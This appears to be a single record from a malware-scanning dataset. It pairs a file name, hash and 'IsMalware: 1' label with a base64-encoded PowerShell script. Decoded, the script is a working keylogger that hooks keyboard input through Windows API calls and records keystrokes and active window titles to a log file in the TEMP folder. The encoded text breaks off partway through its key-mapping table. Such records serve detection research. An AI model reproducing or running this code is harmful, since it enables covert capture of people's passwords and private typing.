intel.ps1,91180d75c04fc2d25952a69a98ad72ed,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gU2Vrb3J0c3llay1UZWcgewoKICAgIFtDbWRsZXRCaW5kaW5nKCldIAogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAoUmVzb2x2ZS1QYXRoIChTcGxpdC1QYXRoIC1QYXJlbnQgLVBhdGggJF8pKSAtUGF0aFR5cGUgQ29udGFpbmVyfSldCiAgICAgICAgW1N0cmluZ10kTG9nUGF0aCA9ICIkKCRlbnY6VEVNUClca2V5LmxvZyIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0KICAgICAgICBbRG91YmxlXSRUaW1lb3V0LAoKICAgICAgICBbUGFyYW1ldGVyKCldCiAgICAgICAgW1N3aXRjaF0kUGFzc1RocnUKICAgICkKCiAgICAkTG9nUGF0aCA9IEpvaW4tUGF0aCAoUmVzb2x2ZS1QYXRoIChTcGxpdC1QYXRoIC1QYXJlbnQgJExvZ1BhdGgpKSAoU3BsaXQtUGF0aCAtTGVhZiAkTG9nUGF0aCkKCiAgICB0cnkgeyAnIlR5cGVkS2V5IiwiV2luZG93VGl0bGUiLCJUaW1lIicgfCBPdXQtRmlsZSAtRmlsZVBhdGggJExvZ1BhdGggLUVuY29kaW5nIHVuaWNvZGUgfQogICAgY2F0Y2ggeyB0aHJvdyAkXyB9CgogICAgJFNjcmlwdCA9IHsKICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwKV0KICAgICAgICAgICAgW1N0cmluZ10kTG9nUGF0aCwKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0KICAgICAgICAgICAgW0RvdWJsZV0kVGltZW91dAogICAgICAgICkKCiAgICAgICAgZnVuY3Rpb24gbG9jYWw6R2V0LURlbGVnYXRlVHlwZSB7CiAgICAgICAgICAgIFBhcmFtICgKICAgICAgICAgICAgICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KICAgICAgICAgICAgICAgIFtUeXBlW11dCiAgICAgICAgICAgICAgICAkUGFyYW1ldGVycyA9IChOZXctT2JqZWN0IFR5cGVbXSgwKSksCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxICldCiAgICAgICAgICAgICAgICBbVHlwZV0KICAgICAgICAgICAgICAgICRSZXR1cm5UeXBlID0gW1ZvaWRdCiAgICAgICAgICAgICkKCiAgICAgICAgICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgogICAgICAgICAgICAkRHluQXNzZW1ibHkgPSBOZXctT2JqZWN0IFJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpCiAgICAgICAgICAgICRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKICAgICAgICAgICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKQogICAgICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pCiAgICAgICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycykKICAgICAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAgICAgJE1ldGhvZEJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkUmV0dXJuVHlwZSwgJFBhcmFtZXRlcnMpCiAgICAgICAgICAgICRNZXRob2RCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgICAgIAogICAgICAgICAgICAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIGxvY2FsOkdldC1Qcm9jQWRkcmVzcyB7CiAgICAgICAgICAgIFBhcmFtICgKICAgICAgICAgICAgICAgIFtPdXRwdXRUeXBlKFtJbnRQdHJdKV0KICAgICAgICAKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkTW9kdWxlLAogICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkUHJvY2VkdXJlCiAgICAgICAgICAgICkKCgogICAgICAgICAgICAkU3lzdGVtQXNzZW1ibHkgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfAogICAgICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS5FcXVhbHMoJ1N5c3RlbS5kbGwnKSB9CiAgICAgICAgICAgICRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKCiAgICAgICAgICAgICRHZXRNb2R1bGVIYW5kbGUgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpCiAgICAgICAgICAgICRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQoKICAgICAgICAgICAgJEtlcm4zMkhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRudWxsLCBAKCRNb2R1bGUpKQogICAgICAgICAgICAkdG1wUHRyID0gTmV3LU9iamVjdCBJbnRQdHIKICAgICAgICAgICAgJEhhbmRsZVJlZiA9IE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigkdG1wUHRyLCAkS2VybjMySGFuZGxlKQogICAgICAgIAoKICAgICAgICAgICAgJEdldFByb2NBZGRyZXNzLkludm9rZSgkbnVsbCwgQChbUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmXSRIYW5kbGVSZWYsICRQcm9jZWR1cmUpKQogICAgICAgIH0KCgoKICAgICAgICBbdm9pZF1bUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoJ1N5c3RlbS5XaW5kb3dzLkZvcm1zJykKCgogICAgICAgICRTZXRXaW5kb3dzSG9va0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIFNldFdpbmRvd3NIb29rRXhBCgkgICAgJFNldFdpbmRvd3NIb29rRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50MzJdLCBbTXVsdGljYXN0RGVsZWdhdGVdLCBbSW50UHRyXSwgW0ludDMyXSkgKFtJbnRQdHJdKQoJICAgICRTZXRXaW5kb3dzSG9va0V4ID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkU2V0V2luZG93c0hvb2tFeEFkZHIsICRTZXRXaW5kb3dzSG9va0V4RGVsZWdhdGUpCgoKICAgICAgICAkQ2FsbE5leHRIb29rRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgQ2FsbE5leHRIb29rRXgKCSAgICAkQ2FsbE5leHRIb29rRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCgkgICAgJENhbGxOZXh0SG9va0V4ID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ2FsbE5leHRIb29rRXhBZGRyLCAkQ2FsbE5leHRIb29rRXhEZWxlZ2F0ZSkKCgogICAgICAgICRVbmhvb2tXaW5kb3dzSG9va0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIFVuaG9va1dpbmRvd3NIb29rRXgKCSAgICAkVW5ob29rV2luZG93c0hvb2tFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW1ZvaWRdKQoJICAgICRVbmhvb2tXaW5kb3dzSG9va0V4ID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVW5ob29rV2luZG93c0hvb2tFeEFkZHIsICRVbmhvb2tXaW5kb3dzSG9va0V4RGVsZWdhdGUpCgoKICAgICAgICAkUGVla01lc3NhZ2VBZGRyID0gR2V0LVByb2NBZGRyZXNzIHVzZXIzMi5kbGwgUGVla01lc3NhZ2VBCgkgICAgJFBlZWtNZXNzYWdlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW1ZvaWRdKQoJICAgICRQZWVrTWVzc2FnZSA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFBlZWtNZXNzYWdlQWRkciwgJFBlZWtNZXNzYWdlRGVsZWdhdGUpCgoKICAgICAgICAkR2V0QXN5bmNLZXlTdGF0ZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgdXNlcjMyLmRsbCBHZXRBc3luY0tleVN0YXRlCgkgICAgJEdldEFzeW5jS2V5U3RhdGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbV2luZG93cy5Gb3Jtcy5LZXlzXSkgKFtJbnQxNl0pCgkgICAgJEdldEFzeW5jS2V5U3RhdGUgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRBc3luY0tleVN0YXRlQWRkciwgJEdldEFzeW5jS2V5U3RhdGVEZWxlZ2F0ZSkKCgogICAgICAgICRHZXRGb3JlZ3JvdW5kV2luZG93QWRkciA9IEdldC1Qcm9jQWRkcmVzcyB1c2VyMzIuZGxsIEdldEZvcmVncm91bmRXaW5kb3cKCSAgICAkR2V0Rm9yZWdyb3VuZFdpbmRvd0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtJbnRQdHJdKQoJICAgICRHZXRGb3JlZ3JvdW5kV2luZG93ID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0Rm9yZWdyb3VuZFdpbmRvd0FkZHIsICRHZXRGb3JlZ3JvdW5kV2luZG93RGVsZWdhdGUpCgoKICAgICAgICAkR2V0V2luZG93VGV4dEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgdXNlcjMyLmRsbCBHZXRXaW5kb3dUZXh0QQoJICAgICRHZXRXaW5kb3dUZXh0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtUZXh0LlN0cmluZ0J1aWxkZXJdLCBbSW50MzJdKSAoW1ZvaWRdKQoJICAgICRHZXRXaW5kb3dUZXh0ID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0V2luZG93VGV4dEFkZHIsICRHZXRXaW5kb3dUZXh0RGVsZWdhdGUpCgoKICAgICAgICAkR2V0TW9kdWxlSGFuZGxlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0TW9kdWxlSGFuZGxlQQoJICAgICRHZXRNb2R1bGVIYW5kbGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbU3RyaW5nXSkgKFtJbnRQdHJdKQoJICAgICRHZXRNb2R1bGVIYW5kbGUgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRNb2R1bGVIYW5kbGVBZGRyLCAkR2V0TW9kdWxlSGFuZGxlRGVsZWdhdGUpCiAgICAKCgogICAgICAgICRDYWxsYmFja1NjcmlwdCA9IHsKICAgICAgICAgICAgUGFyYW0gKAogICAgICAgICAgICAgICAgW1BhcmFtZXRlcigpXQogICAgICAgICAgICAgICAgW0ludDMyXSRDb2RlLAoKICAgICAgICAgICAgICAgIFtQYXJhbWV0ZXIoKV0KICAgICAgICAgICAgICAgIFtJbnRQdHJdJHdQYXJhbSwKCiAgICAgICAgICAgICAgICBbUGFyYW1ldGVyKCldCiAgICAgICAgICAgICAgICBbSW50UHRyXSRsUGFyYW0KICAgICAgICAgICAgKQoKICAgICAgICAgICAgJEtleXMgPSBbV2luZG93cy5Gb3Jtcy5LZXlzXQogICAgICAgIAogICAgICAgICAgICAkTXNnVHlwZSA9ICR3UGFyYW0uVG9JbnQzMigpCgoKICAgICAgICAgICAgaWYgKCRDb2RlIC1nZSAwIC1hbmQgKCRNc2dUeXBlIC1lcSAweDEwMCAtb3IgJE1zZ1R5cGUgLWVxIDB4MTA0KSkgewogICAgICAgICAgICAKICAgICAgICAgICAgICAgICRoV2luZG93ID0gJEdldEZvcmVncm91bmRXaW5kb3cuSW52b2tlKCkKCiAgICAgICAgICAgICAgICAkU2hpZnRTdGF0ZSA9ICRHZXRBc3luY0tleVN0YXRlLkludm9rZSgkS2V5czo6U2hpZnRLZXkpCiAgICAgICAgICAgICAgICBpZiAoKCRTaGlmdFN0YXRlIC1iYW5kIDB4ODAwMCkgLWVxIDB4ODAwMCkgeyAkU2hpZnQgPSAkdHJ1ZSB9CiAgICAgICAgICAgICAgICBlbHNlIHsgJFNoaWZ0ID0gJGZhbHNlIH0KCiAgICAgICAgICAgICAgICAkQ2FwcyA9IFtDb25zb2xlXTo6Q2Fwc0xvY2sKCgogICAgICAgICAgICAgICAgJHZLZXkgPSBbV2luZG93cy5Gb3Jtcy5LZXlzXVtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVhZEludDMyKCRsUGFyYW0pCgoKICAgICAgICAgICAgICAgIGlmICgkdktleSAtZ3QgNjQgLWFuZCAkdktleSAtbHQgOTEpIHsgIyBBbHBoYWJldCBjaGFyYWN0ZXJzCiAgICAgICAgICAgICAgICAgICAgaWYgKCRTaGlmdCAteG9yICRDYXBzKSB7ICRLZXkgPSAkdktleS5Ub1N0cmluZygpIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsgJEtleSA9ICR2S2V5LlRvU3RyaW5nKCkuVG9Mb3dlcigpIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJHZLZXkgLWdlIDk2IC1hbmQgJHZLZXkgLWxlIDExMSkgeyAjIE51bWJlciBwYWQgY2hhcmFjdGVycwogICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoJHZLZXkudmFsdWVfXykgewogICAgICAgICAgICAgICAgICAgICAgICA5NiB7ICRLZXkgPSAnMCcgfQogICAgICAgICAgICAgICAgICAgICAgICA5NyB7ICRLZXkgPSAnMScgfQogICAgICAgICAgICAgICAgICAgICAgICA5OCB7ICRLZXkgPSAnMicgfQogICAgICAgICAgICAgICAgICAgICAgICA5OSB7ICRLZXkgPSAnMycgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDAgeyAkS2V5ID0gJzQnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTAxIHsgJEtleSA9ICc1JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwMiB7ICRLZXkgPSAnNicgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDMgeyAkS2V5ID0gJzcnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTA0IHsgJEtleSA9ICc4JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwNSB7ICRLZXkgPSAnOScgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDYgeyAkS2V5ID0gIioiIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTA3IHsgJEtleSA9ICIrIiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDEwOCB7ICRLZXkgPSAifCIgfQogICAgICAgICAgICAgICAgICAgICAgICAxMDkgeyAkS2V5ID0gIi0iIH0KICAgICAgICAgICAgICAgICAgICAgICAgMTEwIHsgJEtleSA9ICIuIiB9CiAgICAgICAgICAgICAgICAgICAgICAgIDExMSB7ICRLZXkgPSAiLyIgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoKCR2S2V5IC1nZSA0OCAtYW5kICR2S2V5IC1sZSA1NykgLW9yICgkdktleSAtZ2UgMTg2IC1hbmQgJHZLZXkgLWxlIDE5MikgLW9yICgkdktleSAtZ2UgMjE5IC1hbmQgJHZLZXkgLWxlIDIyMikpIHsgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgKCRTaGlmdCkgeyAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKCR2S2V5LnZhbHVlX18pIHsgIyBTaGlmdGFibGUgY2hhcmFjdGVycwogICAgICAgICAgICAgICAgICAgICAgICAgICAgNDggeyAkS2V5ID0gJyknIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDQ5IHsgJEtleSA9ICchJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MCB7ICRLZXkgPSAnQCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTEgeyAkS2V5ID0gJyMnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUyIHsgJEtleSA9ICckJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MyB7ICRLZXkgPSAnJScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTQgeyAkS2V5ID0gJ14nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU1IHsgJEtleSA9ICcmJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1NiB7ICRLZXkgPSAnKicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTcgeyAkS2V5ID0gJygnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4NiB7ICRLZXkgPSAnOicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTg3IHsgJEtleSA9ICcrJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODggeyAkS2V5ID0gJzwnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4OSB7ICRLZXkgPSAnXycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTkwIHsgJEtleSA9ICc+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxOTEgeyAkS2V5ID0gJz8nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE5MiB7ICRLZXkgPSAnficgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjE5IHsgJEtleSA9ICd7JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMjAgeyAkS2V5ID0gJ3wnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIyMSB7ICRLZXkgPSAnfScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjIyIHsgJEtleSA9ICc8RG91YmxlIFF1b3Rlcz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgc3dpdGNoICgkdktleS52YWx1ZV9fKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA0OCB7ICRLZXkgPSAnMCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNDkgeyAkS2V5ID0gJzEnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUwIHsgJEtleSA9ICcyJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1MSB7ICRLZXkgPSAnMycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTIgeyAkS2V5ID0gJzQnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUzIHsgJEtleSA9ICc1JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1NCB7ICRLZXkgPSAnNicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgNTUgeyAkS2V5ID0gJzcnIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDU2IHsgJEtleSA9ICc4JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA1NyB7ICRLZXkgPSAnOScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTg2IHsgJEtleSA9ICc7JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxODcgeyAkS2V5ID0gJz0nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4OCB7ICRLZXkgPSAnLCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTg5IHsgJEtleSA9ICctJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxOTAgeyAkS2V5ID0gJy4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE5MSB7ICRLZXkgPSAnLycgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTkyIHsgJEtleSA9ICdgJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMTkgeyAkS2V5ID0gJ1snIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIyMCB7ICRLZXkgPSAnXCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjIxIHsgJEtleSA9ICddJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMjIgeyAkS2V5ID0gJzxTaW5nbGUgUXVvdGU+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKCR2S2V5KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGMSAgeyAkS2V5ID0gJzxGMT4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkYyICB7ICRLZXkgPSAnPEYyPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjMgIHsgJEtleSA9ICc8RjM+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGNCAgeyAkS2V5ID0gJzxGND4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkY1ICB7ICRLZXkgPSAnPEY1PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjYgIHsgJEtleSA9ICc8RjY+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGNyAgeyAkS2V5ID0gJzxGNz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkY4ICB7ICRLZXkgPSAnPEY4PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RjkgIHsgJEtleSA9ICc8Rjk+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGMTAgeyAkS2V5ID0gJzxGMTA+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGMTEgeyAkS2V5ID0gJzxGMTE+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpGMTIgeyAkS2V5ID0gJzxGMTI+JyB9CgkJCQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6U25hcHNob3QgICAgeyAkS2V5ID0gJzxQcmludCBTY3JlZW4+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpTY3JvbGwgICAgICB7ICRLZXkgPSAnPFNjcm9sbCBMb2NrPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6UGF1c2UgICAgICAgeyAkS2V5ID0gJzxQYXVzZS9CcmVhaz4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6Okluc2VydCAgICAgIHsgJEtleSA9ICc8SW5zZXJ0PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6SG9tZSAgICAgICAgeyAkS2V5ID0gJzxIb21lPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RGVsZXRlICAgICAgeyAkS2V5ID0gJzxEZWxldGU+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpFbmQgICAgICAgICB7ICRLZXkgPSAnPEVuZD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlByaW9yICAgICAgIHsgJEtleSA9ICc8UGFnZSBVcD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6Ok5leHQgICAgICAgIHsgJEtleSA9ICc8UGFnZSBEb3duPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RXNjYXBlICAgICAgeyAkS2V5ID0gJzxFc2M+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpOdW1Mb2NrICAgICB7ICRLZXkgPSAnPE51bSBMb2NrPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6Q2FwaXRhbCAgICAgeyAkS2V5ID0gJzxDYXBzIExvY2s+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpUYWIgICAgICAgICB7ICRLZXkgPSAnPFRhYj4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkJhY2sgICAgICAgIHsgJEtleSA9ICc8QmFja3NwYWNlPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RW50ZXIgICAgICAgeyAkS2V5ID0gJzxFbnRlcj4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlNwYWNlICAgICAgIHsgJEtleSA9ICc8ID4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkxlZnQgICAgICAgIHsgJEtleSA9ICc8TGVmdD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OlVwICAgICAgICAgIHsgJEtleSA9ICc8VXA+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpSaWdodCAgICAgICB7ICRLZXkgPSAnPFJpZ2h0PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6RG93biAgICAgICAgeyAkS2V5ID0gJzxEb3duPicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6TE1lbnUgICAgICAgeyAkS2V5ID0gJzxBbHQ+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpSTWVudSAgICAgICB7ICRLZXkgPSAnPEFsdD4nIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEtleXM6OkxXaW4gICAgICAgIHsgJEtleSA9ICc8V2luZG93cyBLZXk+JyB9CiAgICAgICAgICAgICAgICAgICAgICAgICRLZXlzOjpSV2luICAgICAgICB7ICRLZXkgPSAnPFdpbmRvd3MgS2V5PicgfQogICAgICAgICAgICAgICAgICAgICAgICAkS2V5czo6TFNoaWZ0S2V5ICAgeyAkS2V5ID0gJzxTaGlmdD4nIH0KICAgICAgI